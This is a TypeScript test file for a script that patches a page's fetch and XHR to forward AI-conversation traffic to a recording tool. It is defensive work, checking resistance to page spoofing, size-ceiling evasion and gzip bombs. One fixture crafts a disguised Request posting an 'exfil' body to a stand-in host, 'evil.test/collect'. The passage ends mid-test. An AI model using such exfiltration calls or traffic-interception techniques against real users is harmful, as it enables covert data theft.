// @vitest-environment jsdom
import { describe, expect, it, vi } from 'vitest';

import { installTap } from '../src/tap.ts';
import type { TapToPage } from '../src/tap-protocol.ts';

// A scriptable stand-in for the page's own fetch. Every case asserts the page
// gets back exactly what this returned — the tap must be invisible to it.
function fakeFetch(body: string, init: { status?: number } = {}) {
  const calls: { input: RequestInfo | URL; init: RequestInit | undefined }[] = [];
  const fn = (input: RequestInfo | URL, requestInit?: RequestInit): Promise<Response> => {
    calls.push({ input, init: requestInit });
    return Promise.resolve(new Response(body, { status: init.status ?? 200 }));
  };
  return { fn, calls };
}

// The patched entry point, reached the way the page reaches it. `win` is a bare
// object in these cases, so the DOM lib's own `fetch` signature is not on it.
function fetchOn(win: Window) {
  return (
    win as unknown as { fetch: (input: RequestInfo | URL, init?: RequestInit) => Promise<Response> }
  ).fetch;
}

// One real macrotask turn. The timer is captured before any case can install
// fake timers: vi.useFakeTimers() replaces the global setTimeout, and a turn
// taken through the replacement waits for the fake clock instead of the loop.
const realSetTimeout = globalThis.setTimeout;
function macrotask(): Promise<void> {
  return new Promise((resolve) => {
    realSetTimeout(resolve, 0);
  });
}

// What settle() posts on the tap's end of the channel. No TapToPage type is
// spelled this way, and it is dropped before anything reaches `seen`.
const SETTLED = 'harness:settled';

// The bridge side of the port: collects everything the tap emits.
function harness() {
  const seen: TapToPage[] = [];
  const returned = new Set<number>();
  const channel = new MessageChannel();
  channel.port1.onmessage = (event: MessageEvent) => {
    const data = event.data as TapToPage | { type: typeof SETTLED; marker: number };
    if (data.type === SETTLED) {
      returned.add(data.marker);
      return;
    }
    seen.push(data);
  };
  channel.port1.start();
  // Bound once, before the port is handed to any case, so the marker goes out
  // through the real postMessage however a case later stubs that method on
  // the instance. Read live, a stub that makes the tap's own posts fail would
  // fail settle() as well, on the harness's account rather than the tap's.
  const postAsTap = channel.port2.postMessage.bind(channel.port2);
  // Deliberately typed `unknown`: there is no bridge → tap message shape any
  // more, and the one case that uses this is proving exactly that.
  const send = (message: unknown): void => {
    channel.port1.postMessage(message);
  };
  let nextMarker = 0;
  // Waits until the port has provably drained, rather than for a number of
  // turns. A macrotask first, so every microtask already queued has run — the
  // tap posts from promise callbacks, including a whole response it reads
  // from memory — then a marker posted on the TAP's end of the channel.
  // Messages posted on one port arrive in order, so once the marker is back,
  // everything the tap posted before it has been delivered. Every wait is a
  // real macrotask, never a bare microtask, so a waitFor built on this still
  // hands the loop to streams and the decompressor between attempts.
  //
  // What it cannot see is tap work still waiting on a stream, a decompressor
  // or a timer; a case whose forbidden message would come from there waits on
  // a positive message of the same flow with waitFor. Bounded, and it throws
  // at the bound: a marker that never came back proves nothing drained, and
  // an absence check read after it would pass without having looked.
  const settle = async (): Promise<void> => {
    await macrotask();
    const marker = nextMarker++;
    postAsTap({ type: SETTLED, marker });
    for (let turn = 0; turn < 400; turn += 1) {
      await macrotask();
      if (returned.delete(marker)) return;
    }
    throw new Error('settle(): the marker never came back, so nothing proves the port drained');
  };
  const of = <T extends TapToPage['type']>(type: T) =>
    seen.filter((m): m is Extract<TapToPage, { type: T }> => m.type === type);
  // For a drain that also waits on something other than the port: a stream,
  // the decompressor, a timer. Gives up rather than hanging, so a property
  // that never holds fails on its own assertion instead of on the runner's
  // timeout.
  const waitFor = async (predicate: () => boolean): Promise<void> => {
    for (let attempt = 0; attempt < 400; attempt += 1) {
      if (predicate()) return;
      await settle();
    }
  };
  return { seen, port: channel.port2, send, settle, of, waitFor };
}

// The one endpoint the fetch cases forward, passed to installTap the way the
// build passes its generated table: an exact host plus a path pattern the tap
// anchors at the start of the path.
const CONVERSATION = { host: 'site.test', path: '/api/conversation' };
// A table that matches every path on the one host — never every host, which is
// not a table the build can emit.
const EVERYTHING = { host: 'site.test', path: '.*' };

// The tap's 1 MiB binary-body decode ceiling, and valid text exactly at it and
// one byte past it.
const DECODE_CEILING_BYTES = 1024 * 1024;
const AT_DECODE_CEILING = 'a'.repeat(DECODE_CEILING_BYTES);
const OVER_DECODE_CEILING = `${AT_DECODE_CEILING}a`;

// A window whose `fetch` cannot be replaced. Assignment to a non-writable
// property throws in strict mode, which is what the fetch half has to survive.
function frozenFetchWindow(
  fn: (input: RequestInfo | URL, init?: RequestInit) => Promise<Response>,
) {
  const win = {} as unknown as Window;
  Object.defineProperty(win, 'fetch', { value: fn, writable: false, configurable: false });
  return win;
}

// A scriptable XMLHttpRequest. A fresh class per case, because installTap
// patches the PROTOTYPE and a shared class would carry one case's patch into
// the next. `open`/`send` here are the originals the tap must call through to;
// `respond` is the test's own handle on the response lifecycle.
//
// `status`, `responseType` and `responseText` are PROTOTYPE ACCESSORS over
// private fields, which is where a real XMLHttpRequest carries them. The tap
// reads them through the prototype descriptor with the instance as receiver, so
// a double exposing them as own data properties would make two things
// untestable at once: that read, and the case where a page defines an own
// property over one of them.
function makeXhrClass() {
  return class FakeXhr {
    #status = 0;
    #responseType = '';
    #responseText = '';
    #responseTextThrows = false;
    #sending = false;

    opened: { method: string; url: string } | null = null;
    sent: unknown[] = [];
    listeners: { type: string; fn: () => void; once: boolean }[] = [];

    get status(): number {
      return this.#status;
    }

    get responseType(): string {
      return this.#responseType;
    }

    set responseType(value: string) {
      this.#responseType = value;
    }

    get responseText(): string {
      if (this.#responseTextThrows) {
        throw new Error('responseText is not available for this state');
      }
      return this.#responseText;
    }

    addEventListener(type: string, fn: () => void, options?: { once?: boolean }): void {
      this.listeners.push({ type, fn, once: options?.once === true });
    }

    open(method: string, url: string): void {
      // A real open() over a send that is still in flight ABORTS it, and that
      // abort fires the earlier send's own `loadend` from inside this call —
      // which is the only way the tap's state-identity check is ever reached.
      if (this.#sending) {
        this.#sending = false;
        this.#status = 0;
        this.#responseText = '';
        this.#dispatchLoadend();
      }
      this.opened = { method, url };
    }

    send(body?: unknown): void {
      this.#sending = true;
      this.sent.push(body);
    }

    // Delivers a response for whatever send is in flight. `text` is optional so
    // a case can arrange for responseText to throw first.
    respond(status: number, text?: string): void {
      this.#sending = false;
      this.#status = status;
      if (text !== undefined) this.#responseText = text;
      this.#dispatchLoadend();
    }

    // Makes the prototype getter throw, the way a real one does for a state it
    // cannot serve as text.
    failResponseText(): void {
      this.#responseTextThrows = true;
    }

    loadendListeners(): number {
      return this.listeners.filter((l) => l.type === 'loadend').length;
    }

    #dispatchLoadend(): void {
      for (const entry of [...this.listeners]) {
        if (entry.type !== 'loadend') continue;
        if (entry.once) this.listeners = this.listeners.filter((l) => l !== entry);
        entry.fn();
      }
    }
  };
}

function xhrWindow() {
  const Xhr = makeXhrClass();
  return { win: { XMLHttpRequest: Xhr } as unknown as Window, create: () => new Xhr() };
}

/**
 * Gzip `text` the way a page would: through CompressionStream, so the bytes
 * under test are a real gzip member rather than a hand-built header.
 */
async function gzipOf(text: string): Promise<Uint8Array<ArrayBuffer>> {
  const stream = new CompressionStream('gzip');
  const writer = stream.writable.getWriter();
  void writer.write(new TextEncoder().encode(text));
  void writer.close();
  const chunks: Uint8Array[] = [];
  const reader = stream.readable.getReader();
  for (;;) {
    const step = await reader.read();
    if (step.done) break;
    chunks.push(step.value);
  }
  const total = chunks.reduce((sum, c) => sum + c.byteLength, 0);
  const joined = new Uint8Array(new ArrayBuffer(total));
  let at = 0;
  for (const c of chunks) {
    joined.set(c, at);
    at += c.byteLength;
  }
  return joined;
}

describe('installTap: the command surface', () => {
  it('accepts no message, so nothing in the page can widen what it forwards', async () => {
    const { fn } = fakeFetch('telemetry');
    const win = { fetch: fn } as unknown as Window;
    const h = harness();

    // Installed with an EMPTY table, exactly as the shipped build installs it.
    installTap(win, h.port, []);
    // A well-formed command that would match everything. The page shares this
    // window's event target and can take the transferred port off the
    // handshake, so a tap that read from it would be a tap the page — not the
    // build — decides the reach of, and what the tap forwards is what AKA goes
    // on to persist.
    h.send({ type: 'configure', endpoints: [{ host: 'site.test', path: '.*' }] });
    await h.settle();
    await fetchOn(win)('https://site.test/api/conversation');
    await h.settle();

    expect(h.of('request')).toHaveLength(0);
    expect(h.of('chunk')).toHaveLength(0);
  });

  it('forwards that same table when the BUILD supplies it — the control on the case above', async () => {
    // Without this, "forwarded nothing" is satisfied by a harness that never
    // reaches the tap at all, and the refusal above proves nothing.
    const { fn } = fakeFetch('telemetry');
    const win = { fetch: fn } as unknown as Window;
    const h = harness();

    installTap(win, h.port, [EVERYTHING]);
    await fetchOn(win)('https://site.test/api/conversation');
    await h.settle();

    expect(h.of('request')).toHaveLength(1);
  });
});

describe('installTap: what counts as a match', () => {
  it('forwards nothing from a foreign origin whose URL carries the pattern text', async () => {
    // An endpoint is a SITE's endpoint. Tested against a whole href with no
    // host check, the pattern matches any origin that happens to contain the
    // text — and the tap runs on pages whose own script chooses what origins to
    // fetch, so that is traffic the page picks and AKA then records as the
    // site's own.
    const { fn } = fakeFetch('not the site');
    const win = { fetch: fn } as unknown as Window;
    const h = harness();
    installTap(win, h.port, [CONVERSATION]);

    // The pattern text in a foreign origin's path…
    await fetchOn(win)('https://evil.test/api/conversation');
    // …in a foreign origin's query, on an innocent path…
    await fetchOn(win)('https://evil.test/collect?next=/api/conversation');
    // …in the RIGHT host's query…
    await fetchOn(win)('https://site.test/collect?next=/api/conversation');
    // …and on the right host but further along the path, which the anchor is
    // what refuses.
    await fetchOn(win)('https://site.test/redirect/api/conversation');
    await h.settle();

    expect(h.of('request')).toHaveLength(0);

    // The positive control on the same matcher: the genuine host and path still
    // forward, so the absences above are the host and anchor checks working
    // rather than the table having stopped matching anything at all.
    await fetchOn(win)('https://site.test/api/conversation');
    await h.settle();
    expect(h.of('request')).toHaveLength(1);
  });

  it("reads a Request's url and method off the prototype, not off the instance", async () => {
    // fetch resolves a Request through its internal slots, so an own property
    // defined over the prototype accessor changes what the TAP sees and nothing
    // about where the browser goes. Read that way, page script can have a
    // fabricated exchange recorded against a matched endpoint while the real
    // request goes somewhere else entirely.
    const { fn, calls } = fakeFetch('body');
    const win = { fetch: fn } as unknown as Window;
    const h = harness();
    installTap(win, h.port, [CONVERSATION]);

    const disguised = new Request('https://evil.test/collect', {
      method: 'POST',
      body: '{"exfil":1}',
    });
    Object.defineProperty(disguised, 'url', {
      value: 'https://site.test/api/conversation',
      configurable: true,
    });
    Object.defineProperty(disguised, 'method', { value: 'GET', configurable: true });
    await fetchOn(win)(disguised);
    await h.settle();

    expect(h.of('request')).toHaveLength(0);
    // And the page's own call still went out exactly as it wrote it.
    expect(calls).toHaveLength(1);

    // The positive control on the same read: an unshadowed Request forwards,
    // carrying the values the prototype reports.
    const genuine = new Request('https://site.test/api/conversation', {
      method: 'POST',
      body: '{"prompt":"hi"}',
    });
    await fetchOn(win)(genuine);
    await h.settle();

    expect(h.of('request')[0]).toMatchObject({
      url: 'https://site.test/api/conversation',
      method: 'POST',
      body: '{"prompt":"hi"}',
    });
  });
});

describe('installTap: the fetch half', () => {
  it('reports what it patched, and an empty table forwards nothing', async () => {
    const { fn } = fakeFetch('body');
    const win = { fetch: fn, XMLHttpRequest: undefined } as unknown as Window;
    const h = harness();

    installTap(win, h.port, []);
    await fetchOn(win)('https://site.test/api/conversation');
    await h.settle();

    expect(h.of('patched')[0]).toMatchObject({ fetch: true, xhr: false });
    expect(h.of('request')).toHaveLength(0);
  });

  it("patches XHR and reports the blind spot when the page's fetch cannot be replaced", async () => {
    // The whole fail-open property in one case: an unwritable `fetch` used to
    // throw straight out of installTap, so the XHR half was never patched and
    // neither `ready` nor `patched` was ever posted — the bridge saw silence
    // where it should have seen a reported blind spot.
    const { fn } = fakeFetch('body');
    const { win: xhrWin, create } = xhrWindow();
    const win = frozenFetchWindow(fn);
    (win as unknown as { XMLHttpRequest: unknown }).XMLHttpRequest = (
      xhrWin as unknown as { XMLHttpRequest: unknown }
    ).XMLHttpRequest;
    const h = harness();

    installTap(win, h.port, [CONVERSATION]);
    await h.settle();

    expect(h.of('ready')).toHaveLength(1);
    expect(h.of('patched')[0]).toMatchObject({ fetch: false, xhr: true });

    // And the XHR half really is live, not merely reported as live.
    const xhr = create();
    xhr.open('POST', 'https://site.test/api/conversation');
    xhr.send('{"prompt":"hi"}');
    xhr.respond(200, 'assistant reply');
    await h.settle();
    expect(h.of('request')).toHaveLength(1);
  });

  it('decodes a typed-array body carrying UTF-8 text', async () => {
    // A typed array also has forEach, whose callback receives a NUMBER per
    // index, so the URLSearchParams/FormData branch used to render a whole body
    // as `0=&1=&2=…`. It is decoded rather than walked — and rather than
    // refused, because reading a typed array consumes nothing, so unlike a
    // stream it costs the page's own request nothing.
    const { fn } = fakeFetch('ok');
    const win = { fetch: fn } as unknown as Window;
    const h = harness();

    installTap(win, h.port, [CONVERSATION]);
    await fetchOn(win)('https://site.test/api/conversation', {
      method: 'POST',
      body: new TextEncoder().encode('{"prompt":"hi"}'),
    });
    await h.settle();

    expect(h.of('request')[0]).toMatchObject({ method: 'POST', body: '{"prompt":"hi"}' });
  });

  it('forwards a typed-array body carrying tab, newline and carriage return', () => {
    // The C0 scan carves those three out, because a text body does carry them:
    // an NDJSON or pretty-printed body is nothing but. Without a case holding
    // it, deleting that line keeps every other body test green and drops a
    // real completion body as `unparsed_body`.
    const { fn } = fakeFetch('ok');
    const win = { fetch: fn } as unknown as Window;
    const h = harness();
    const body = '{\n\t"prompt": "hi"\r\n}';

    installTap(win, h.port, [CONVERSATION]);
    return fetchOn(win)('https://site.test/api/conversation', {
      method: 'POST',
      body: new TextEncoder().encode(body),
    })
      .then(() => h.settle())
      .then(() => {
        expect(h.of('request')[0]).toMatchObject({ body });
        expect(h.of('error')).toHaveLength(0);
      });
  });

  it('forwards a typed-array body exactly at the decode ceiling', async () => {
    // The ceiling refuses what is over it, not what reaches it, so a body of
    // exactly that many bytes still decodes and forwards. Without this, the
    // refusal below holds just as well for a ceiling one byte too strict.
    const { fn } = fakeFetch('ok');
    const win = { fetch: fn } as unknown as Window;
    const h = harness();

    installTap(win, h.port, [CONVERSATION]);
    await fetchOn(win)('https://site.test/api/conversation', {
      method: 'POST',
      body: new TextEncoder().encode(AT_DECODE_CEILING),
    });
    await h.settle();

    // By length, so a failure prints a number rather than a megabyte of text.
    expect(h.of('request').map((m) => m.body?.length)).toEqual([DECODE_CEILING_BYTES]);
  });

  it('refuses a typed-array body over the decode ceiling', () => {
    // The ceiling bounds a synchronous fatal-mode decode on the page's own
    // call stack. One byte past the case above, so the two hold the
    // comparison from both sides. This buffer's own `.byteLength` tells the
    // truth, so it cannot say which read the ceiling is charged against; the
    // cases after it can.
    const { fn } = fakeFetch('ok');
    const win = { fetch: fn } as unknown as Window;
    const h = harness();

    installTap(win, h.port, [CONVERSATION]);
    return fetchOn(win)('https://site.test/api/conversation', {
      method: 'POST',
      // Valid, control-free text: an all-zero buffer would be refused by the
      // C0 scan instead, and the case would then pass with no ceiling at all.
      body: new TextEncoder().encode(OVER_DECODE_CEILING),
    })
      .then(() => h.settle())
      .then(() => {
        expect(h.of('error')[0]).toMatchObject({ reason: 'unparsed_body' });
        expect(h.of('request')).toHaveLength(0);
      });
  });

  it.each([
    ['a typed array', () => new TextEncoder().encode(OVER_DECODE_CEILING)],
    ['an ArrayBuffer', () => new TextEncoder().encode(OVER_DECODE_CEILING).slice().buffer],
  ])('refuses %s over the decode ceiling whose own byteLength says 0', async (_shape, make) => {
    // The ceiling is charged against size accessors the tap captured at
    // load, because `.byteLength` is the page's to redefine: read live, a
    // body that reports 0 takes its own bound off.
    const { fn } = fakeFetch('ok');
    const win = { fetch: fn } as unknown as Window;
    const h = harness();
    installTap(win, h.port, [CONVERSATION]);

    const body = make();
    Object.defineProperty(body, 'byteLength', { value: 0, configurable: true });
    // What a live read now sees. Without it, a define that did not take
    // would leave the case passing with nothing to see through.
    expect(body.byteLength).toBe(0);

    await fetchOn(win)('https://site.test/api/conversation', { method: 'POST', body });
    await h.settle();

    expect(h.of('error')[0]).toMatchObject({ reason: 'unparsed_body' });
    expect(h.of('request')).toHaveLength(0);
  });

  it.each([
    [
      'a typed array',
      // %TypedArray%.prototype, which has no global name of its own.
      Object.getPrototypeOf(Uint8Array.prototype) as object,
      () => Uint8Array.from(new TextEncoder().encode(OVER_DECODE_CEILING)),
    ],
    [
      'an ArrayBuffer',
      ArrayBuffer.prototype,
      () => Uint8Array.from(new TextEncoder().encode(OVER_DECODE_CEILING)).buffer,
    ],
  ])(
    'refuses %s over the decode ceiling whose inherited getter says 0',
    async (_shape, shared, make) => {
      // The same spoof one level up: a getter moved on the prototype that
      // owns it reaches every object of that kind in the realm, including a
      // tap that looked the accessor up when it measured rather than when it
      // loaded. The own-property cases above cannot see that: a lookup made
      // at call time either starts at the prototype, which they leave alone,
      // or finds their own data property, which carries no getter.
      //
      // Each body is built through the global Uint8Array rather than taken
      // straight from TextEncoder. Under jsdom the encoder is Node's own, and
      // what it returns inherits from different prototypes than the globals
      // the tap captured its getters from, so a spoof on those reaches the
      // body but not the prototypes the tap reads.
      const reply = new Response('ok');
      const win = { fetch: () => Promise.resolve(reply) } as unknown as Window;
      const h = harness();
      installTap(win, h.port, [CONVERSATION]);

      const body = make();
      const original = Object.getOwnPropertyDescriptor(shared, 'byteLength');
      if (original === undefined || !('get' in original)) {
        throw new Error('this prototype carries no byteLength getter');
      }

      // Held for the synchronous call alone, and restored before anything is
      // awaited: the getter is shared by every object of this kind built from
      // the same constructors, whatever else in the process holds one. The
      // tap decides on a body inside that call.
      let reported: unknown;
      let sent: Promise<Response> | undefined;
      Object.defineProperty(shared, 'byteLength', { get: () => 0, configurable: true });
      try {
        reported = body.byteLength;
        sent = fetchOn(win)('https://site.test/api/conversation', { method: 'POST', body });
      } finally {
        Object.defineProperty(shared, 'byteLength', original);
      }
      // What a live read on the body saw inside the window: the spoof took,
      // and it took on the prototype this body really inherits from.
      expect(reported).toBe(0);
      await sent;
      await h.settle();

      expect(h.of('error')[0]).toMatchObject({ reason: 'unparsed_body' });
      expect(h.of('request')).toHaveLength(0);
    },
  );

  it('refuses a binary body that is not valid UTF-8', async () => {
    // The control for the case above: decoding is gated on the bytes actually
    // being text, so an image or an archive is still nothing the tap reads.
    const { fn } = fakeFetch('ok');
    const win = { fetch: fn } as unknown as Window;
    const h = harness();

    installTap(win, h.port, [CONVERSATION]);
    await fetchOn(win)('https://site.test/api/conversation', {
      method: 'POST',
      body: new Uint8Array([0xff, 0xfe, 0xfd, 0xfc]),
    });
    await h.settle();

    expect(h.of('error')[0]).toMatchObject({ reason: 'unparsed_body' });
    expect(h.of('request')).toHaveLength(0);
  });

  it('ends an exchange whose response carries no body at all', async () => {
    // A 204 is the case the null-body drain exists for: `new Response(null,
    // { status: 204 }).body` is null, so nothing streams and nothing would
    // close the exchange. Dropping the `end` post here leaves the bridge
    // holding the id for the life of the page — an exchange that never
    // completes, which is indistinguishable from one still in flight.
    const win = { fetch: () => Promise.resolve(new Response(null, { status: 204 })) };
    const h = harness();

    installTap(win as unknown as Window, h.port, [CONVERSATION]);
    await fetchOn(win as unknown as Window)('https://site.test/api/conversation', {
      method: 'POST',
      body: '{"prompt":"hi"}',
    });
    await h.waitFor(() => h.of('end').length > 0);

    expect(h.of('request')).toHaveLength(1);
    expect(h.of('end')[0]).toMatchObject({ status: 204, ok: true });
    // No chunk was invented for a body that does not exist.
    expect(h.of('chunk')).toHaveLength(0);
  });

  it('inflates a gzip-compressed request body', async () => {
    // A real site compresses its completion body client-side, so the bytes are
    // never valid UTF-8 and the decode branch above refuses every one of them.
    // Inflating is safe for the same reason decoding is: reading a buffer
    // consumes nothing, so the page's own request still carries its body.
    const { fn } = fakeFetch('ok');
    const win = { fetch: fn } as unknown as Window;
    const h = harness();

    installTap(win, h.port, [CONVERSATION]);
    await fetchOn(win)('https://site.test/api/conversation', {
      method: 'POST',
      body: await gzipOf('{"prompt":"hi"}'),
    });
    // The inflate is a stream read, so it spans more than one macrotask.
    await h.waitFor(() => h.of('request').length > 0);

    expect(h.of('request')[0]).toMatchObject({ method: 'POST', body: '{"prompt":"hi"}' });
  });

  it('forwards no body for a gzip body that expands past the inflate ceiling', async () => {
    // The compressed size bounds the expansion not at all, so the ceiling is
    // charged against the output AS IT ARRIVES. Without it a few KB of gzip
    // exhausts the tab's memory on demand.
    //
    // A failed inflate is a DEFERRED body that rejected, so it takes the same
    // path a Request clone that could not be read takes: the exchange still
    // opens, carrying a null body, rather than being refused outright. That is
    // deliberate — the response half is still worth capturing — and what
    // matters here is that the partial read never reaches the wire.
    const { fn } = fakeFetch('ok');
    const win = { fetch: fn } as unknown as Window;
    const h = harness();

    installTap(win, h.port, [CONVERSATION]);
    await fetchOn(win)('https://site.test/api/conversation', {
      method: 'POST',
      body: await gzipOf('a'.repeat(5 * 1024 * 1024)),
    });
    await h.waitFor(() => h.of('request').length > 0 || h.of('error').length > 0);

    expect(h.of('request')).toHaveLength(1);
    expect(h.of('request')[0]).toMatchObject({ method: 'POST', body: null });
  });

  it('forwards no body for a gzip body whose inflated bytes are not text', async () => {
    // The gate the plain-bytes branch applies, applied to what came OUT of the
    // decompressor: inflating is a way to reach the bytes, never a reason to
    // trust them. Same deferred-rejection path as the ceiling case above.
    const { fn } = fakeFetch('ok');
    const win = { fetch: fn } as unknown as Window;
    const h = harness();

    installTap(win, h.port, [CONVERSATION]);
    await fetchOn(win)('https://site.test/api/conversation', {
      method: 'POST',
      body: await gzipOf('{\u0000\u0000}'),
    });
    await h.waitFor(() => h.of('request').length > 0 || h.of('error').length > 0);

    expect(h.of('request')).toHaveLength(1);
    expect(h.of('request')[0]).toMatchObject({ method: 'POST', body: null });
  });

  it('refuses binary that decodes cleanly but carries control characters', async () => {
    // Valid UTF-8 is not the same as text. A run of NULs decodes without
    // throwing, and bytes like that are data rather than a body worth parsing.
    const { fn } = fakeFetch('ok');
    const win = { fetch: fn } as unknown as Window;
    const h = harness();

    installTap(win, h.port, [CONVERSATION]);
    await fetchOn(win)('https://site.test/api/conversation', {
      method: 'POST',
      body: new Uint8Array([0x7b, 0x00, 0x00, 0x7d]),
    });
    await h.settle();

    expect(h.of('error')[0]).toMatchObject({ reason: 'unparsed_body' });
    expect(h.of('request')).toHaveLength(0);
  });

  it('forwards a matched request and its response, and returns the page its own body', async () => {
    const { fn, calls } = fakeFetch('hello from the site');
    const win = { fetch: fn } as unknown as Window;
    const h = harness();

    installTap(win, h.port, [CONVERSATION]);

    const response = await fetchOn(win)('https://site.test/api/conversation', {
      method: 'POST',
      body: '{"prompt":"hi"}',
    });
    // The page's own body is intact and readable — the tap consumed a clone.
    expect(await response.text()).toBe('hello from the site');
    // And the site's own call went out exactly as it wrote it.
    expect(calls[0]?.init?.body).toBe('{"prompt":"hi"}');

    await h.settle();
    expect(h.of('request')[0]).toMatchObject({ method: 'POST', body: '{"prompt":"hi"}' });
    expect(
      h
        .of('chunk')
        .map((m) => m.text)
        .join(''),
    ).toBe('hello from the site');
    expect(h.of('end')[0]).toMatchObject({ status: 200, ok: true });
  });

  it('ignores a request no endpoint matches', async () => {
    const { fn } = fakeFetch('telemetry');
    const win = { fetch: fn } as unknown as Window;
    const h = harness();

    installTap(win, h.port, [CONVERSATION]);
    await fetchOn(win)('https://site.test/api/telemetry');
    await h.settle();

    expect(h.of('request')).toHaveLength(0);
  });

  it('reads no request body until the URL has matched', async () => {
    // Body planning used to run BEFORE the match check, so every Request-object
    // fetch was cloned and read — work on traffic the tap ignores, and a
    // promise abandoned with nobody to handle its rejection.
    const { fn } = fakeFetch('telemetry');
    const win = { fetch: fn } as unknown as Window;
    const h = harness();

    // Spied on the PROTOTYPE, and before the install: the tap captures
    // Request.prototype.clone while it is the only script that has run, so a
    // spy on the instance — or one added after — is bypassed by design. This is
    // the only seam left that can see whether a body was read.
    const clone = vi.spyOn(Request.prototype, 'clone');
    try {
      installTap(win, h.port, [CONVERSATION]);

      const ignored = new Request('https://site.test/api/telemetry', {
        method: 'POST',
        body: '{"beacon":1}',
      });
      await fetchOn(win)(ignored);
      await h.settle();

      expect(clone).not.toHaveBeenCalled();
      expect(ignored.bodyUsed).toBe(false);

      // The positive control: a Request the table DOES match is still read, so
      // the assertion above is the match check working and not the Request
      // branch having stopped reading bodies at all.
      const watched = new Request('https://site.test/api/conversation', {
        method: 'POST',
        body: '{"prompt":"hi"}',
      });
      await fetchOn(win)(watched);
      await h.settle();

      expect(clone).toHaveBeenCalledTimes(1);
      expect(h.of('request')[0]).toMatchObject({ method: 'POST', body: '{"prompt":"hi"}' });
    } finally {
      clone.mockRestore();
    }
  });

  it('lets the page through untouched when its own forwarding throws', async () => {
    const { fn } = fakeFetch('still fine');
    const win = { fetch: fn } as unknown as Window;
    const h = harness();
    installTap(win, h.port, [CONVERSATION]);
    // A port that throws on every post is the whole failure class: the tap must
    // swallow it and the page must never notice.
    vi.spyOn(h.port, 'postMessage').mockImplementation(() => {
      throw new Error('port is gone');
    });

    const response = await fetchOn(win)('https://site.test/api/conversation');
    expect(await response.text()).toBe('still fine');
  });

  it('propagates a rejected fetch to the page unchanged, and closes the exchange', async () => {
    // Two properties in one call, because they are the same moment. The page's
    // promise rejects with the reason it was given — the tap's own reporting
    // rides a SIDE chain that the returned promise never passes through. And
    // the exchange the tap opened with `request` is closed: without a
    // terminator the bridge holds that id for the life of the page.
    const boom = new Error('offline');
    const win = { fetch: () => Promise.reject(boom) } as unknown as Window;
    const h = harness();
    installTap(win, h.port, [CONVERSATION]);

    await expect(fetchOn(win)('https://site.test/api/conversation')).rejects.toBe(boom);
    await h.settle();

    expect(h.of('request')).toHaveLength(1);
    expect(h.of('error')[0]).toMatchObject({ reason: 'aborted' });
    expect(h.of('end')).toHaveLength(1);
  });

  it('closes an exchange whose response body errored', async () => {
    // An abort of the page's own read — the site's stop button — or a dropped
    // connection errors the stream, so the tap's reader rejects instead of ever
    // reaching `done`. Without a terminator on that path the bridge holds the
    // id for the life of the page.
    //
    // Deliberately no surviving chunk to assert on: erroring a stream discards
    // what is queued in it, and the response pipeline pulls the source ahead of
    // the tap's own read, so a chunk enqueued before the error does not reach
    // the tap at all. Measured, not assumed.
    const stream = new ReadableStream<Uint8Array>({
      pull(controller) {
        controller.error(new Error('connection dropped'));
      },
    });
    const win = {
      fetch: () => Promise.resolve(new Response(stream)),
    } as unknown as Window;
    const h = harness();
    installTap(win, h.port, [CONVERSATION]);

    await fetchOn(win)('https://site.test/api/conversation');
    await h.waitFor(() => h.of('end').length > 0);

    expect(h.of('request')).toHaveLength(1);
    expect(h.of('error')[0]).toMatchObject({ reason: 'tap_error' });
    expect(h.of('end')).toHaveLength(1);
  });

  it('reports a fault inside its own read callback rather than rejecting into the page', async () => {
    // A throw inside the reader callback is not caught by the promise's own
    // rejection handler — it rejects the chain that handler belongs to, and
    // nothing downstream handles that, so it surfaces in the page's realm as an
    // unhandled rejection. A chunk that is not bytes makes the decode throw
    // exactly there.
    const stream = new ReadableStream<Uint8Array>({
      start(controller) {
        controller.enqueue('not bytes' as unknown as Uint8Array);
        controller.close();
      },
    });
    const win = {
      fetch: () => Promise.resolve(new Response(stream)),
    } as unknown as Window;
    const h = harness();
    installTap(win, h.port, [CONVERSATION]);

    await fetchOn(win)('https://site.test/api/conversation');
    await h.waitFor(() => h.of('end').length > 0);

    expect(h.of('error')[0]).toMatchObject({ reason: 'tap_error' });
    expect(h.of('end')).toHaveLength(1);
  });

  it("reports a request body it cannot read rather than consuming the page's stream", async () => {
    const { fn } = fakeFetch('ok');
    const win = { fetch: fn } as unknown as Window;
    const h = harness();
    installTap(win, h.port, [CONVERSATION]);

    const stream = new ReadableStream<Uint8Array>({
      start(controller) {
        controller.enqueue(new TextEncoder().encode('streamed'));
        controller.close();
      },
    });
    await fetchOn(win)('https://site.test/api/conversation', {
      method: 'POST',
      body: stream as unknown as BodyInit,
      // @ts-expect-error duplex is required for a stream body and is not in the DOM lib here
      duplex: 'half',
    });
    await h.settle();

    expect(h.of('error')[0]).toMatchObject({ reason: 'unparsed_body' });
    // The report is only half of it: a stream has ONE reader, so a tap that
    // reported and then read anyway would have emptied the page's own request.
    // An unlocked stream is what says it was left alone.
    expect(stream.locked).toBe(false);
    // And nothing further is followed about a request the tap could not read.
    // That exchange was never opened, so it is closed by nothing.
    expect(h.of('chunk')).toHaveLength(0);
    expect(h.of('end')).toHaveLength(0);
  });

  it('closes a rejected fetch only after the deferred body has opened it', async () => {
    // The ordering the protocol rests on: every exchange opened with `request`
    // is closed by exactly one `end`, and nothing closes an id that was never
    // opened. For a deferred body `request` is posted when the cloned body
    // settles, or at the deadline — while a rejection fires at once. The abort
    // terminator therefore has to wait on the same promise the response posts
    // wait on, or the wire carries `error` + `end` first and `request` up to
    // the deadline later: the bridge closes an id it never opened, then opens
    // one that nothing ever closes and that consumes a pendingSends entry
    // belonging to a later send.
    const never = new ReadableStream<Uint8Array>({
      start() {
        // Deliberately never enqueues and never closes, so the clone's read
        // cannot settle and only the deadline can post `request`.
      },
    });
    const request = new Request('https://site.test/api/conversation', {
      method: 'POST',
      body: never,
      duplex: 'half',
    } as RequestInit & { duplex: string });
    const boom = new Error('aborted by the page');
    const win = { fetch: () => Promise.reject(boom) } as unknown as Window;
    const h = harness();
    installTap(win, h.port, [CONVERSATION]);

    vi.useFakeTimers();
    try {
      await expect(fetchOn(win)(request)).rejects.toBe(boom);
      // The rejection has already been delivered. Nothing may be on the wire
      // yet, because `request` is still waiting on the deadline — this is the
      // assertion that fails when the terminator does not wait.
      //
      // settle() turns the loop through a timer captured before the fake
      // clock was installed, so it drains the port without moving that clock
      // and the deadline still cannot fire.
      await h.settle();
      expect(h.seen.filter((m) => m.type !== 'ready' && m.type !== 'patched')).toEqual([]);

      await vi.advanceTimersByTimeAsync(60_000);
    } finally {
      vi.useRealTimers();
    }
    await h.waitFor(() => h.of('end').length > 0);

